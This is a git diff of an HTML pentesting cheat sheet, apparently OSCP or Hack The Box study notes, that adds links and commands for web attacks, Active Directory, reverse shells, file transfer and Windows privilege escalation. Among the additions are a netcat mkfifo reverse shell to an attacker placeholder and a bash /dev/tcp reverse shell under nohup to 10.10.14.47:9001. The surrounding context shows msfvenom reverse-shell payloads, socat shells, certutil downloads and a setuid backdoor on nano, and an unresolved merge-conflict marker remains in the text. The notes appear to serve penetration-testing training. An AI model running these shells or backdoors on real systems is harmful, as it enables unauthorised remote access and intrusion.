@@ -67,7 +67,8 @@
 https://github.com/laramies/metagoofil
 
 #Port Knocking
-https://www.digitalwhisper.co.il/files/Zines/0x02/DW2-5-Port-Knocking.pdf
+Great Read - https://www.digitalwhisper.co.il/files/Zines/0x02/DW2-5-Port-Knocking.pdf
+Using nmap - https://wiki.archlinux.org/index.php/Port_knocking
 </pre>
 <hr>
 <p><h3>IPv6:</h3></p>
@@ -139,6 +140,10 @@ joomlavs.rb -u [TARGET_URL] --scan-all	(Check -h option for help)
 <hr>
 <p><h3>SQL Injection</h3></p>
 <pre style="background-color:black;color:white;">
+<<<<<<< HEAD
+=======
+#Basic course - https://www.youtube.com/watch?v=BR-VeQUoRCw&list=PLZOToVAK85Mr4CzRimmw4KD84yUjkEAEw
+>>>>>>> 545754cd2725e66c2c80f598e81692ae116bab57
 #Intro
 http://www.anonhack.in/2015/09/sql-injection-part-1/
 
@@ -168,16 +173,30 @@ http://www.anonhack.in/2018/07/boolean-based-blind-sql-injection-how-to-do-manua
 <p><font size="3.5" color="black">* https://github.com/Gandosha/OSCP/blob/master/Documents/SQL%20Injection%20Cheatsheet.md</font></p>
 <br>
 <p><font size="3.5" color="black">Examples:</font></p>
-<p><font size="3.5" color="black">* Boolean Blind SQL Injection - https://www.youtube.com/watch?v=4LM_EIehbsU</font></p>
+<p><font size="3.5" color="black">* Boolean Blind SQL Injection - https://0xdf.gitlab.io/2019/01/12/htb-oz.html / https://www.youtube.com/watch?v=4LM_EIehbsU</font></p>
 <p><font size="3.5" color="black">* Time Based SQL Injection - https://www.youtube.com/watch?v=mphLv1ZCMf8 </font></p>
 <p><font size="3.5" color="black">* Error Based + upload shell https://www.youtube.com/watch?v=vPgMi7R9tvs  /  https://www.youtube.com/watch?v=0xrDZi8Qq0A</font></p>
 <p><font size="3.5" color="black">* From MSSQL to RCE - https://www.tarlogic.com/en/blog/red-team-tales-0x01/</font></p>
 <hr>
-<p><h3>XSS</h3></p>
-<p><font size="3.5" color="black">XSS Filter Evasion Cheat Sheet - https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#Basic_XSS_Test_Without_Filter_Evasion</font></p>
-<p><font size="3.5" color="black">XSS Filter Evasion eval(String.fromCharCode() method - http://jdstiles.com/java/cct.html
+<p><h3>Cross Site Scripting (XSS)</h3></p>
+<pre style="background-color:black;color:white;">
+#Great read - https://excess-xss.com/
+#XSS Filter Evasion Cheat Sheet - https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#Basic_XSS_Test_Without_Filter_Evasion
+#XSS Filter Evasion eval(String.fromCharCode() method - http://jdstiles.com/java/cct.html
+</pre>
 <hr>
-<p><h3>LFI</h3></p>
+<p><h3>XML External Entity (XXE) Injection</h3></p>
+<pre style="background-color:black;color:white;">
+https://gandosha.github.io/XXE_injection
+#Great read - https://gardienvirtuel.ca/fr/actualites/from-xml-to-rce.php
+</pre>
+<hr>
+<p><h3>Cross Site Request Forgery (CSRF)</h3></p>
+<pre style="background-color:black;color:white;">
+https://gandosha.github.io/csrf_examples (from Mutillidae II)
+</pre>
+<hr>
+<p><h3>Local File Inclusion (LFI)</h3></p>
 <pre style="background-color:black;color:white;">
 #Great read: 
 http://www.securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html		#LFI guide
@@ -294,7 +313,7 @@ ftp [IP_ADDRESS]
 ftp> mget *	#get all the files in current directory
 
 wget --mirror 'ftp://[FTP_USER]:[FTP_USER_PASSWORD]@[DOMAIN_NAME]'	#get all the content in that ftp server
-exiftool [FILE]	#extract file's metadata
+wget --no-passive 'ftp://[FTP_USER]:[FTP_USER_PASSWORD]@[IP_ADDRESS]'	#get all the content in that ftp server
 </pre>
 <hr>
 <p><h3>Active Directory stuff</h3></p>
@@ -314,6 +333,21 @@ Run "neo4j start" before importing the created zip file.
 Examples:
 HTB Reel - https://www.youtube.com/watch?v=ob9SgtFm6_g&t=2122s
 HTB Active - https://www.youtube.com/watch?v=jUc1J31DNdw&t=1105s	
+</pre>
+<hr>
+<p><h3>NTLM</h3></p>
+<pre style="background-color:black;color:white;">
+#Great read - https://docs.microsoft.com/en-us/windows/desktop/secauthn/microsoft-ntlm
+#Great vid - https://www.youtube.com/watch?v=jJS5PTrhQpE
+#Why NTLM sucks?
+https://www.youtube.com/watch?v=8DnL2pnulVk
+https://www.youtube.com/watch?v=17DwDrnURj8
+</pre>
+<hr>
+<p><h3>Kerberos</h3></p>
+<pre style="background-color:black;color:white;">
+#Great vid - https://www.youtube.com/watch?v=kp5d8Yv3-0c
+#Great read - https://docs.microsoft.com/en-us/windows/desktop/secauthn/microsoft-kerberos
 </pre>
 <hr>
 <p><h3>Impacket</h3></p>
@@ -632,11 +666,27 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] PORT=[ATTACKER's_PORT] -f macho > shell.macho	(reverse shell using msfvenom)
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f [LANGUAGE]		(reverse shell using msfvenom - shellcode)
 </pre>
+<p><font size="3.5" color="black">Netcat</font></p>
+<pre style="background-color:black;color:white;">
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER's_IP_ADDRESS] [ATTACKER's_PORT] >/tmp/f
+</pre>
 <p><font size="3.5" color="black">Socat</font></p>
 <pre style="background-color:black;color:white;">
 #if there's no socat on the system you can use the binary here - https://github.com/andrew-d/static-binaries
 socat file:`tty`,raw,echo=0 tcp-listen:443	#attacker
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[LHOST_IP]:443 #victim
+</pre>
+<p><font size="3.5" color="black">ICMP</font></p>
+<pre style="background-color:black;color:white;">
+#Download
+https://github.com/inquisb/icmpsh
+https://github.com/samratashok/nishang
+
+#Usage
+/nishang/Shells/Invoke-PowerShellIcmp.ps1
+
+#Example
+https://www.youtube.com/watch?v=IbVmpr6IFQU&t=995s	(HTB - Minion)
 </pre>
 <p><font size="3.5" color="black">MSF stuff</font></p>
 <pre style="background-color:black;color:white;">
@@ -686,6 +736,7 @@ os.execute('/bin/sh')
 <p><h3>File Transfer</h3></p>
 <pre style="background-color:black;color:white;">
 certutil -urlcache -split -f http://[ATTACKERS_MACHINE]/[FILE_TO_TRANSFER] C:\\users\public\[FILE_TO_TRANSFER]	#certutil method (Linux --> Windows)
+SMB - https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html
 python3 -m http.server [PORT]	#Simple HTTP request handler - very basic web server serving files relative to the current directory - In Arch
 python -m SimpleHTTPServer [PORT]	#In Kali
 php -S 127.0.0.1:8080	#HTTP request handler in php
@@ -705,6 +756,7 @@ php -S 127.0.0.1:8080	#HTTP request handler in php
 <p><font size="3.5" color="black">Basic enumeration:</font></p>
 <pre style="background-color:black;color:white;">
 whoami /priv	#user's privileges on the system
+cmdkey /list	#Will display a list of all user names and credentials that are stored in the computer	(HTB-Access example: https://www.youtube.com/watch?v=Rr6Oxrj2IjU&t=1558s)
 
 #list of privileges that can be abused by Rotten Potato.
 SeImpersonatePrivilege
@@ -721,7 +773,9 @@ SeDebugPrivilege
 #https://github.com/foxglovesec/RottenPotato		#rottenpotato.exe exploit
 #https://github.com/breenmachine/RottenPotatoNG		#Newer exploit	
 
-PowerUp.ps1 (add 'Invoke-AllChecks' at the end of the script and invoke it)	#Powersploit
+#Automation
+* JAWS - Just Another Windows (Enum) Script - https://github.com/411Hall/JAWS
+* PowerUp.ps1 (add 'Invoke-AllChecks' at the end of the script and invoke it)	#Powersploit
 sc query state= all type= all | findstr SERVICE_NAME	#enumerate services and drivers
 </pre>
 <p><font size="3.5" color="black">Search for license.rtf / eula.txt:</font></p>
@@ -1230,6 +1284,9 @@ chmod u+s /bin/nano    # installs the backdoor
 <hr>
 <p><h3>More</h3></p>
 <pre style="background-color:black;color:white;">
+nohup - run a command immune to hangups, with output to a non-tty (example: "nohup bash -i >& /dev/tcp/10.10.14.47/9001 0>&1 &")
+exiftool [FILE]	#extract file's metadata
+binwalk #tool for searching binary images for embedded files and executable code
 sort [WORDLIST_PATH] | uniq          (Outputs unique words in a wordlist that is found)
 sort [WORDLIST_PATH] | uniq | wc -l  (sorts number of unique words in a wordlist that is found)
 ip -4 addr show scope global    /*Determine interfaces ip address + prefix*/
@@ -1239,6 +1296,9 @@ base64 -d [FILE] > [OUTPUT_FILE]	(decode in CLI)
 
 keepass2john [KEYPASS_FILE.kdbx]	#Convert the key to john the ripper format (take what starts with $keepass$ till the end in order to crack it - see also hashcat modules)
 Use this keepass file in order to discover what is inside using keepassx (on Kali) - for example: https://www.youtube.com/watch?v=l-wzBhc9wFc.
+
+zip2john [zip_file_name].zip > [zip_file_name].hash 	#Convert the key to john the ripper format (and crack it)
+
 
 #Command output redirection
 > file redirects stdout to file
@@ -1251,6 +1311,10 @@ Use this keepass file in order to discover what is inside using keepassx (on Kal
 #Golang
 Working with files - https://www.devdungeon.com/content/working-files-go
 Concurreny - https://medium.com/@trevor4e/learning-gos-concurrency-through-illustrations-8c4aff603b3 
+
+#Steganography
+https://github.com/StefanoDeVuono/steghide
+[cmd] --> steghide extract -sf [file_name.jpg]
 </pre>
 <hr>
 <p><h3>Other (quick) guides & Links</h3></p>
@@ -1260,6 +1324,7 @@ Concurreny - https://medium.com/@trevor4e/learning-gos-concurrency-through-illus
 <p><font size="3.5" color="black">Misc - http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html</font></p>
 <p><font size="3.5" color="black">PT - https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/</font></p>
 <p><font size="3.5" color="black">PT - https://github.com/chouaibhm/OSCP-Survival-Guide-1/blob/master/OSCP_Helpful_Links.md</font></p>
+<p><font size="3.5" color="black">shellshock bug - https://fedoramagazine.org/shellshock-how-does-it-actually-work/</font></p>
 <hr>
 </div>
 </div>
